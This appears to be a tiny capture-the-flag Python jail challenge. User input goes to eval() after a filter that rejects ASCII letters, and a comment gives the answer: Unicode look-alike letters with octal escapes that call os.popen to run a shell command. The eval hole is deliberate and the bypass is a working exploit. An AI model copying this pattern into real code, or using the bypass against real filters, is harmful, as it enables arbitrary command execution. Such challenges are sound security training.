import os

def waf(s):
    for i in s:
        if i in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
            return False
    return True

code = input('code> ')
if not waf(code):
    exit()

# try to calc  ---> answer : ºſ.ᵖºᵖᵉⁿ('\143\141\154\143').ʳᵉªᵈ()
eval(code)
